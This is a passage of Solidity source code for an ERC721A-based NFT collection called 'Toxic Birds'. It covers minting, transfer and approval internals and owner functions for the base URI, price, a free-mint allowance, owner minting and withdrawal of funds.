1086         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1087         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1088         unchecked {
1089             _addressData[to].balance += uint128(quantity);
1090             _addressData[to].numberMinted += uint128(quantity);
1091 
1092             _ownerships[startTokenId].addr = to;
1093             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1094 
1095             uint256 updatedIndex = startTokenId;
1096 
1097             for (uint256 i; i < quantity; i++) {
1098                 emit Transfer(address(0), to, updatedIndex);
1099                 if (safe) {
1100                     require(
1101                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1102                         "ERC721A: transfer to non ERC721Receiver implementer"
1103                     );
1104                 }
1105 
1106                 updatedIndex++;
1107             }
1108 
1109             currentIndex = updatedIndex;
1110         }
1111 
1112         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1113     }
1114 
1115     /**
1116      * @dev Transfers `tokenId` from `from` to `to`.
1117      *
1118      * Requirements:
1119      *
1120      * - `to` cannot be the zero address.
1121      * - `tokenId` token must be owned by `from`.
1122      *
1123      * Emits a {Transfer} event.
1124      */
1125     function _transfer(
1126         address from,
1127         address to,
1128         uint256 tokenId
1129     ) private {
1130         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1131 
1132         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1133             getApproved(tokenId) == _msgSender() ||
1134             isApprovedForAll(prevOwnership.addr, _msgSender()));
1135 
1136         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1137 
1138         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1139         require(to != address(0), "ERC721A: transfer to the zero address");
1140 
1141         _beforeTokenTransfers(from, to, tokenId, 1);
1142 
1143         // Clear approvals from the previous owner
1144         _approve(address(0), tokenId, prevOwnership.addr);
1145 
1146         // Underflow of the sender's balance is impossible because we check for
1147         // ownership above and the recipient's balance can't realistically overflow.
1148         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1149         unchecked {
1150             _addressData[from].balance -= 1;
1151             _addressData[to].balance += 1;
1152 
1153             _ownerships[tokenId].addr = to;
1154             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1155 
1156             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1157             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1158             uint256 nextTokenId = tokenId + 1;
1159             if (_ownerships[nextTokenId].addr == address(0)) {
1160                 if (_exists(nextTokenId)) {
1161                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1162                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1163                 }
1164             }
1165         }
1166 
1167         emit Transfer(from, to, tokenId);
1168         _afterTokenTransfers(from, to, tokenId, 1);
1169     }
1170 
1171     /**
1172      * @dev Approve `to` to operate on `tokenId`
1173      *
1174      * Emits a {Approval} event.
1175      */
1176     function _approve(
1177         address to,
1178         uint256 tokenId,
1179         address owner
1180     ) private {
1181         _tokenApprovals[tokenId] = to;
1182         emit Approval(owner, to, tokenId);
1183     }
1184 
1185     /**
1186      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1187      * The call is not executed if the target address is not a contract.
1188      *
1189      * @param from address representing the previous owner of the given token ID
1190      * @param to target address that will receive the tokens
1191      * @param tokenId uint256 ID of the token to be transferred
1192      * @param _data bytes optional data to send along with the call
1193      * @return bool whether the call correctly returned the expected magic value
1194      */
1195     function _checkOnERC721Received(
1196         address from,
1197         address to,
1198         uint256 tokenId,
1199         bytes memory _data
1200     ) private returns (bool) {
1201         if (to.isContract()) {
1202             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1203                 return retval == IERC721Receiver(to).onERC721Received.selector;
1204             } catch (bytes memory reason) {
1205                 if (reason.length == 0) {
1206                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1207                 } else {
1208                     assembly {
1209                         revert(add(32, reason), mload(reason))
1210                     }
1211                 }
1212             }
1213         } else {
1214             return true;
1215         }
1216     }
1217 
1218     /**
1219      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1220      *
1221      * startTokenId - the first token id to be transferred
1222      * quantity - the amount to be transferred
1223      *
1224      * Calling conditions:
1225      *
1226      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1227      * transferred to `to`.
1228      * - When `from` is zero, `tokenId` will be minted for `to`.
1229      */
1230     function _beforeTokenTransfers(
1231         address from,
1232         address to,
1233         uint256 startTokenId,
1234         uint256 quantity
1235     ) internal virtual {}
1236 
1237     /**
1238      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1239      * minting.
1240      *
1241      * startTokenId - the first token id to be transferred
1242      * quantity - the amount to be transferred
1243      *
1244      * Calling conditions:
1245      *
1246      * - when `from` and `to` are both non-zero.
1247      * - `from` and `to` are never both zero.
1248      */
1249     function _afterTokenTransfers(
1250         address from,
1251         address to,
1252         uint256 startTokenId,
1253         uint256 quantity
1254     ) internal virtual {}
1255 }
1256 
1257 contract ToxicBirds721A  is ERC721A, Ownable, ReentrancyGuard {
1258     string public baseURI = "ipfs://QmYjPVqQEnvRuw1GE5fKG9WrUo2x8qi3RMHgm3RnNMdvVr/";
1259     uint   public price             = 0.003 ether;
1260     uint   public maxPerTx          = 20;
1261     uint   public maxPerFree        = 1;
1262     uint   public totalFree         = 1111;
1263     uint   public maxSupply         = 3333;
1264 
1265     mapping(address => uint256) private _mintedFreeAmount;
1266 
1267     constructor() ERC721A("TOXIC BIRDS", "ToxicBirds721A"){}
1268 
1269 
1270     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1271         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1272         string memory currentBaseURI = _baseURI();
1273         return bytes(currentBaseURI).length > 0
1274             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1275             : "";
1276     }
1277 
1278     function mint(uint256 count) external payable {
1279         uint256 cost = price;
1280         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1281             (_mintedFreeAmount[msg.sender] + count <= maxPerFree));
1282 
1283         if (isFree) {
1284             cost = 0;
1285             _mintedFreeAmount[msg.sender] += count;
1286         }
1287 
1288         require(msg.value >= count * cost, "Please send the exact amount.");
1289         require(totalSupply() + count <= maxSupply, "No more");
1290         require(count <= maxPerTx, "Max per TX reached.");
1291 
1292         _safeMint(msg.sender, count);
1293     }
1294 
1295     function sleeping(address mintAddress, uint256 count) public onlyOwner {
1296         _safeMint(mintAddress, count);
1297     }
1298 
1299 
1300 
1301     function _baseURI() internal view virtual override returns (string memory) {
1302         return baseURI;
1303     }
1304 
1305     function setBaseUri(string memory baseuri_) public onlyOwner {
1306         baseURI = baseuri_;
1307     }
1308 
1309     function setPrice(uint256 price_) external onlyOwner {
1310         price = price_;
1311     }
1312 
1313     function withdraw() external onlyOwner nonReentrant {
1314         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1315         require(success, "Transfer failed.");
1316     }
1317 }